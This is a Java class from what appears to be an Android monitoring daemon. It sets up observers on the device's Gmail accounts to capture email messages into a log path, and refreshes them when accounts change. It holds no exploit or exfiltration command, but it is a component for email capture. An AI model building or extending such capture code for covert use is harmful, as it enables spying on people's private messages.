package com.vvt.daemon.email;

import java.util.HashSet;

import android.content.Context;

import com.vvt.daemon.email.GmailObserver.OnCaptureListener;
import com.vvt.logger.FxLog;

public class GmailCapturingManager implements GmailObserver.OnAccountChangeListener{
	
	private static final String TAG = "GmailCapturingManager";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	private static GmailCapturingManager sInstance;
	
	@SuppressWarnings("unused")
	private Context mContext;
	private HashSet<String> mAccounts;
	private GmailObserver mEmailObservers;
	
	private OnCaptureListener mListener;
	private String mLoggablePath;
	private String mDateFormat;
	
	public static GmailCapturingManager getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new GmailCapturingManager(context);
		}
		return sInstance;
	}
	
	private GmailCapturingManager(Context context) {
		mContext = context;
	}
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setDateFormat(String format) {
		mDateFormat = format;
	}

	public void registerObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "registerObserver # ENTER ...");
//		boolean isRegisSuccess = false;
		if (mEmailObservers != null) {
			if(LOGD) FxLog.d(TAG, "registerObserver # Registration conflicted!!");
			return;
		}
		
		mListener = listener;
		
		mAccounts = GmailDatabaseManager.getGmailAccount();
		
		if(LOGV) FxLog.v(TAG, "registerObserver # Update refID for each account ...");
		GmailCapturingHelper.initializeRefIds(mAccounts, mLoggablePath);
		
//		if (mAccounts.size() > 0) {
		if(LOGV) FxLog.v(TAG, "registerObserver # Instantiate observers collection");
			if (mEmailObservers == null) {
				mEmailObservers = GmailObserver.getGmailObserver(mAccounts);
			}
			if(LOGV) FxLog.v(TAG, "registerObserver # setup observer...");
			mEmailObservers.setLoggablePath(mLoggablePath);
			mEmailObservers.setDateFormat(mDateFormat);
			mEmailObservers.register(mListener, this);
//			isRegisSuccess =true;
//		}
//		else {
//			//Only one that can enter to this case is NO ACCOUNT 
//			FxLog.w(TAG, "registerObserver # No observer registered");
//			isRegisSuccess =false;
//		}
		
		if(LOGV) FxLog.v(TAG, "registerObserver # EXIT ...");
//		return isRegisSuccess;
	}
	
	public void unregisterObserver() {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # ENTER ...");
		
		if(LOGD) FxLog.d(TAG, "unregisterObserver # Unregister emails observer");
		if (mEmailObservers != null) {
			mEmailObservers.unregister(mListener);
			mEmailObservers = null;
		}
		if (mAccounts != null) {
			mAccounts.clear();
		}
		
		mListener = null;
		
		if(LOGV) FxLog.v(TAG, "unregisterObserver # EXIT ...");
	}
	
	

	private void refreshEmailCapturing() {
		if(LOGV) FxLog.v(TAG, "refreshEmailCapturing # ENTER ...");
		
		// Backup current listener
		OnCaptureListener listener = mListener;
		
		// listener (member) will be reset here
		unregisterObserver();
		
		// Use the backup listener
		registerObserver(listener);
		
		if(LOGV) FxLog.v(TAG, "refreshEmailCapturing # EXIT ...");
	}

	
	@Override
	public void onAccountChange() {
		refreshEmailCapturing();
	}
	
}
